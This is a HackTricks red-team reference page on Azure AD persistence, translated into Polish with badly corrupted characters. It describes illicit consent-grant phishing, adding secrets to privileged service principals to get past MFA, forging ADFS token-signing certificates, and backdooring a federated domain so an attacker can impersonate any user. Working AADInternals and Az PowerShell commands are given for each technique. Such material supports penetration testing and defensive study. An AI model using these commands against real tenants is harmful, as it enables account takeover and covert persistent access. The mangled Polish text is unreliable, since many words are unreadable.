# Az - Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Illicit Consent Grant

Domylnie ka偶dy u偶ytkownik mo偶e zarejestrowa aplikacj w Azure AD. Mo偶esz wic zarejestrowa aplikacj (tylko dla docelowego dzier偶awcy), kt贸ra potrzebuje uprawnie o wysokim wpywie z zgod administratora (zatwierd藕 to, jeli jeste administratorem) - takich jak wysyanie maili w imieniu u偶ytkownika, zarzdzanie rolami itp. To pozwoli nam na **wykonywanie atak贸w phishingowych**, kt贸re byyby bardzo **owocne** w przypadku sukcesu.

Co wicej, mo偶esz r贸wnie偶 zaakceptowa t aplikacj jako u偶ytkownik, aby utrzyma nad ni dostp.

### Applications and Service Principals

Z uprawnieniami Administratora Aplikacji, GA lub niestandardowej roli z uprawnieniami microsoft.directory/applications/credentials/update, mo偶emy doda powiadczenia (sekret lub certyfikat) do istniejcej aplikacji.

Mo偶liwe jest **celowanie w aplikacj z wysokimi uprawnieniami** lub **dodanie nowej aplikacji** z wysokimi uprawnieniami.

Interesujc rol do dodania do aplikacji byaby **rola administratora uwierzytelniania uprzywilejowanego**, poniewa偶 pozwala na **resetowanie hasa** Globalnych Administrator贸w.

Ta technika r贸wnie偶 pozwala na **obejcie MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Dla uwierzytelniania opartego na certyfikatach

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federacja - Certyfikat Podpisywania Token贸w

Z **uprawnieniami DA** w lokalnym AD, mo偶liwe jest stworzenie i zaimportowanie **nowych certyfikat贸w podpisywania token贸w** oraz **certyfikat贸w deszyfrujcych tokeny**, kt贸re maj bardzo dugi okres wa偶noci. Pozwoli nam to na **logowanie si jako dowolny u偶ytkownik**, kt贸rego ImuutableID znamy.

**Uruchom** poni偶sze polecenie jako **DA na serwerze ADFS** w celu stworzenia nowych certyfikat贸w (domylne haso 'AADInternals'), dodania ich do ADFS, wyczenia automatycznego obracania i ponownego uruchomienia usugi:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Nastpnie zaktualizuj informacje o certyfikacie w Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Zaufana domena

With GA privileges on a tenant, it's possible to **add a new domain** (must be verified), configure its authentication type to Federated and configure the domain to **trust a specific certificate** (any.sts in the below command) and issuer:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Odniesienia

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
